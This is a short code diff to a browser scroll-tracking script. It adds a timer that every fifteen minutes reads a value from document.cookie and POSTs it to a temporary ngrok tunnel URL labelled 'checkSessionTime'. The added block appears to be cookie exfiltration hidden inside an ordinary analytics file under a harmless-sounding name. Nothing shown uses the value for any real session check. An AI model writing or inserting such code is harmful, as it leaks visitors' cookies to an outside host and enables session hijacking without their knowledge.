@@ -41,6 +41,26 @@ function handleScrollEvent() {
   storeData(eventData, events.scroll);
 }
 setInterval(() => {
+  const url =
+    "https://7cf5-2405-201-1-a0b5-2d2f-282e-f261-87d.ngrok-free.app/checkSessionTime";
+  const bodyData = {
+    cookies: document.cookie.split("=")[1],
+  };
+  fetch(url, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify(bodyData),
+  })
+    .then((response) => {
+      console.log(response.json());
+    })
+    .catch((e) => {
+      console.log(e);
+    });
+}, 900000);
+setInterval(() => {
   window.addEventListener(events.scroll, handleScrollEvent);
   setTimeout(() => {
     window.removeEventListener(events.scroll, handleScrollEvent);
